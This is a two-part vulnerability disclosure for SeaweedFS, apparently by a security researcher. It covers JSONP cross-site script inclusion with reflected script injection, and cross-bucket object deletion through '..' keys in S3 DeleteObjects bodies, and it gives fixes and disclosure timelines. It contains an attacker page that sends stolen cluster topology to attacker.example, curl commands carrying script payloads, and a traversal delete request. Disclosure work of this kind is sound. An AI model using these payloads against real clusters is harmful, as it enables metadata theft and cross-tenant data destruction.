https://github.com/seaweedfs/seaweedfs

# Finding 1: Unauthenticated JSONP callback reflection on master/filer/volume HTTP endpoints

Affected Versions: confirmed on commit f72c5ec5d390e3202fb6acc8c05fd25a177a7375 (latest master, runtime version 30GB 4.28 adfd731bb); writeJson callback handling unchanged since the original handler was introduced

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N

CWE: CWE-79 Improper Neutralization of Input During Web Page Generation (Cross-site Scripting), with CWE-200 (Information Exposure) as the practical impact


### Summary
Every SeaweedFS HTTP endpoint that returns JSON via the shared writeJson helper reflects the value of the `callback` query parameter verbatim into a script body served with `Content-Type: application/javascript`. The endpoints carry no `X-Content-Type-Options: nosniff`, no `Content-Disposition: attachment`, and no CORS allow-list, so a third-party web page can load any of them through a `<script src=...>` tag and read the returned cluster topology, volume locations, file IDs, or directory listings cross-origin. Because the callback name is also unsanitized, an attacker who can place an authenticated user's session next to the cluster (for example, an operator on the same network or VPN as the master) can additionally inject arbitrary text at the start of the response, which executes as JavaScript in the attacker's origin and, under MIME-sniffing browsers, can be rendered as HTML in the master origin.

By default the master, volume, and filer servers all run without `-whiteList`, without `security.toml`, and bound to `0.0.0.0`, so every callable endpoint is reachable from any host that can route to the cluster.

### Details
The writeJson helper in weed/server/common.go consults the `callback` form value on every response and, when present, emits a JavaScript wrapper with the callback name interpolated raw:

File: weed/server/common.go
```
113	callback := r.FormValue("callback")
114	if callback == "" {
115		w.Header().Set("Content-Type", "application/json")
116		w.WriteHeader(httpStatus)
...
121	} else {
122		w.Header().Set("Content-Type", "application/javascript")
123		w.WriteHeader(httpStatus)
...
127		if _, err = w.Write([]uint8(callback)); err != nil {
128			return
129		}
130		if _, err = w.Write([]uint8("(")); err != nil {
131			return
132		}
133		fmt.Fprint(w, string(bytes))
134		if _, err = w.Write([]uint8(")")); err != nil {
135			return
136		}
137	}
```

No callback-name validation, no length limit, no character allow-list, and no security headers are emitted. Every handler in weed/server/ that eventually calls writeJson, writeJsonQuiet, or writeJsonError inherits this behavior. Concretely, the following unauthenticated endpoints are exposed by default:

Master (port 9333, bound to 0.0.0.0):
- GET /dir/status (full cluster topology: data centers, racks, volume servers, volumes, layouts)
- GET /dir/lookup (volume server URLs and internal gRPC ports for any volume id)
- GET /dir/assign (allocates a fileId and returns the assigned volume server URL)
- GET /cluster/status (raft leader, max volume id)
- GET /vol/status, /vol/grow, /col/delete (the master gates these with guard.WhiteList, but the gate is inert when no whitelist and no signing key is configured, which is the default)

Volume server (port 8080, bound to 0.0.0.0):
- GET /status (disk usage, every volume id, file counts, deleted byte counts)

Filer (port 8888, bound to 0.0.0.0):
- GET / (when the request carries Accept: application/json) returns the directory listing as JSON

Because the response is served as application/javascript, modern browsers will execute it when fetched via `<script src=...>` from any origin. The classic JSONP cross-site-script-inclusion (XSSI) attack works as written:

```html
<!-- attacker.example -->
<script>
window.stealTopology = function(data) {
  fetch("https://attacker.example/exfil", {method:"POST", body: JSON.stringify(data)});
};
</script>
<script src="http://master.internal:9333/dir/status?callback=stealTopology"></script>
```

The browser loads the cross-origin script, the runtime executes `stealTopology({...topology...})`, and the function in the attacker page receives the full cluster topology including internal hostnames, gRPC ports, volume ids, and storage layouts. The same primitive applied to `/dir/lookup?volumeId=N&callback=...` returns the private URL of the volume server that holds each volume, which makes the next step (writing or deleting data directly against the volume server, since it is also unauthenticated by default) straightforward.

A secondary consequence is reflected script injection. Because the callback string is emitted at the very top of the response body without escaping, a URL such as
```
http://master.internal:9333/dir/status?callback=<script>alert(document.domain)</script>
```
yields a response that begins with the literal `<script>alert(document.domain)</script>(...)`. The Content-Type is application/javascript, which prevents direct rendering as HTML on modern browsers, but the response carries no `X-Content-Type-Options: nosniff` header, so any client that elects to MIME-sniff the body (older browsers, embedded WebViews, or middleware that rewrites the type) will interpret it as HTML and execute the injected script in the master server's origin.

### PoC
Run the upstream docker-compose with no authentication (this is the documented quick-start), then issue the request from any host on the same network:

```sh
docker run --rm -d -p 9333:9333 -p 8080:8080 -p 8888:8888 \
  chrislusf/seaweedfs:latest server \
  -master.ip=127.0.0.1 -ip.bind=0.0.0.0 \
  -filer -filer.port=8888 -volume.port=8080

# Cross-origin data leak via JSONP
curl -i 'http://127.0.0.1:9333/dir/status?callback=stealTopology'
# HTTP/1.1 200 OK
# Content-Type: application/javascript
# stealTopology({"Topology":{"Max":10,"Free":2,...,"DataNodes":[{"Url":"volume:8080",...,"VolumeIds":" 1-7"}]}],...})

# Volume server URL disclosure
curl -i 'http://127.0.0.1:9333/dir/lookup?volumeId=1&callback=stealLocation'
# HTTP/1.1 200 OK
# Content-Type: application/javascript
# stealLocation({"volumeOrFileId":"1","locations":[{"url":"volume:8080",...,"grpcPort":18080}]})

# Reflected script injection in response body (no nosniff header)
curl -i 'http://127.0.0.1:9333/dir/status?callback=<script>alert(1)</script>'
# HTTP/1.1 200 OK
# Content-Type: application/javascript
# <script>alert(1)</script>({...})
```

Browser-driven end-to-end PoC (the attacker hosts evil.html on attacker.example):

```html
<!doctype html>
<script>
window.f = function(d){ document.body.innerText = JSON.stringify(d); };
</script>
<script src="http://master.internal:9333/dir/status?callback=f"></script>
```

A victim who loads `https://attacker.example/evil.html` from a workstation that can route to `master.internal:9333` will render the full cluster topology in the attacker's page. No master credentials, IAM identity, or SeaweedFS JWT is required at any point.

### Impact
Anyone able to lure a network-positioned victim (operator, CI runner, internal service with a browser, embedded WebView in an admin tool) onto an attacker-controlled URL can read SeaweedFS cluster metadata cross-origin. The leaked information is sufficient to:

1. Enumerate every data center, rack, and volume server, including internal hostnames and gRPC ports.
2. Resolve any volume id to the volume server URL that holds it, which combined with the default-unauthenticated volume server reads is enough to fetch arbitrary stored objects when the file id is known or guessable.
3. Probe administrative endpoints (/vol/grow, /col/delete) that are reachable in the default no-whitelist configuration to mutate cluster state.

The class is JSONP cross-site script inclusion. The fix is to either remove the `callback` feature entirely (no AWS or Minio surface currently relies on it) or to validate the callback against a strict regular expression like `^[A-Za-z_$][A-Za-z0-9_$]{0,63}$` and add `X-Content-Type-Options: nosniff` to every JSON / JavaScript response.


### Disclosure

- reported vulnerability in v4.28 on 25 May 2026
- fixed on 26 May 2026 via https://github.com/seaweedfs/seaweedfs/pull/9686. maintainer offered to credit me in GHSA and CVE
<img width="1238" height="377" alt="image" src="https://github.com/user-attachments/assets/2eea782b-fa2e-474f-ac8b-0f03d2a8fc61" />

- fix released in v4.30
  <img width="1051" height="557" alt="image" src="https://github.com/user-attachments/assets/c264ed59-222f-4071-80b9-3df4c577922d" />
- requested for CVE on 26 May 2026
- followed up on my request for CVE on 13 June 2026
- no response since, disclosed on 29 June 2026




# Finding 2: Cross-bucket object deletion in the S3 gateway via DeleteMultipleObjects body keys (incomplete fix of the cross-bucket path-traversal advisory)

Affected Versions: confirmed on current main, post-v4.30 (commit 4f8af45)

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H (8.1 High)

CWE: CWE-22 Path Traversal (with CWE-639); incomplete fix


### Summary

A `..`-bearing object key supplied in the XML body of an S3 `DeleteObjects` request escapes the caller's bucket directory and deletes objects in a different bucket, bypassing IAM. This is a distinct surface from the published cross-bucket-traversal advisory, whose v4.30 fix (`validateRequestPath` middleware) validates only URL-captured mux vars and never inspects request-body keys. Confirmed against the real sink chain: a `../victim-bucket/secret.txt` body key resolves into the victim bucket and is deleted, while the existing `IsValidObjectKey` guard (which would reject it) is never called on this path.

### Details

Source: `ObjectIdentifier.Key` parsed from the request XML body in `DeleteMultipleObjectsHandler` (`weed/s3api/s3api_object_handlers_delete.go:380` `xml.Unmarshal`, iterated ~422).

Flow:
1. Route `weed/s3api/s3api_server.go:845`: `bucket.Methods(POST)...Queries("delete","")` has no `Path(objectPath)`, so mux captures only `{bucket}`; there is no `{object}` var.
2. `validateRequestPath` middleware (`weed/s3api/s3api_path_validation.go:18`, the v4.30 fix) checks only `vars["bucket"]`/`vars["object"]`; body keys are invisible to it.
3. The route authorizes at bucket level only (`authRequestWithAuthType`, object empty for the `?delete` POST; `auth_credentials.go:125-129` defers to per-key authz).
4. Per-key `AuthorizeBatchDeleteKey(r, identity, bucket, object.Key, ...)` (`auth_credentials.go:2393`) evaluates the policy with the raw key under the attacker bucket, so `../victim/secret` is treated as a key in the attacker's bucket and is allowed.
5. Sink: `deleteUnversionedObjectWithClient` (`s3api_object_handlers_delete.go:175`) -> `util.NewFullPath(s3a.bucketDir(bucket), object)` -> `FullPath.Child` raw string concat -> `/buckets/<attacker>/../victim/secret`.
6. `DirAndName()` -> `deleteObjectEntry` -> filer gRPC `DeleteEntry` (`weed/server/filer_grpc_server.go:728`) calls `util.JoinPath` = `filepath.Join`, which collapses `..` and deletes `/buckets/victim/secret`.

The boundary crossed is cross-tenant/cross-bucket: an authenticated S3 principal with write access to bucket A and no grant on bucket B destroys arbitrary objects in B (or, with `enableAuth=false`, any unauth client). The guard `IsValidObjectKey` (`s3_constants/header.go:186`, documented to reject keys that escape the bucket directory) is never called on these body keys.

### PoC

scripts/poc_seaweedfs_deleteobjects_traversal.md.

```
POST /attacker-bucket?delete
<Delete><Object><Key>../victim-bucket/secret.txt</Key></Object></Delete>
-> deletes /buckets/victim-bucket/secret.txt
```

Validated by driving the exact sink chain (`S3ApiServer.bucketDir`, `util.NewFullPath`, `DirAndName`, `util.JoinPath`) plus the un-applied guard, with the real functions:

```
IsValidObjectKey("../victim-bucket/secret.txt") = false   -> the URL-path fix WOULD block this key
attacker authorized for bucket: attacker-bucket
bucketDir(attacker-bucket) = /buckets/attacker-bucket
body Key = ../victim-bucket/secret.txt
NewFullPath = /buckets/attacker-bucket/../victim-bucket/secret.txt
DirAndName -> dir="/buckets/attacker-bucket/../victim-bucket" name="secret.txt"
filer DeleteEntry resolves (util.JoinPath) -> /buckets/victim-bucket/secret.txt
CONFIRMED: delete escaped attacker bucket and targets the VICTIM bucket
```

`IsValidObjectKey` returns false, proving the guard exists but is not wired to this path.

### Impact

An authenticated tenant with one writable bucket (or any client when auth is disabled) deletes arbitrary objects in other tenants' buckets, cross-tenant data destruction. Integrity and availability impact is high; no confidentiality via this handler (delete returns no content).

### Remediation

In `DeleteMultipleObjectsHandler`, validate every `object.Key` with the existing `s3_constants.IsValidObjectKey(object.Key)` and reject on failure before authorization/deletion, the same guard the v4.30 middleware applies to URL vars. More robustly, normalize and confine the final filer path to `bucketDir(bucket)` (reject any resolved path not strictly under the bucket root) in `deleteUnversionedObjectWithClient`, so all body- and header-sourced keys are covered centrally.

### Disclosure

- reported for version post-v4.30
- acknowledged on 14 June 2026 by maintainer
<img width="1204" height="242" alt="image" src="https://github.com/user-attachments/assets/077712e4-9f9d-4e7e-ac7b-d6926057cb4c" />

- verified fix on 14 June 2026
- fixed in #9931 in v4.31
<img width="922" height="287" alt="image" src="https://github.com/user-attachments/assets/5f152a2c-ca03-4378-8f6b-25ca34a45dd7" />

  
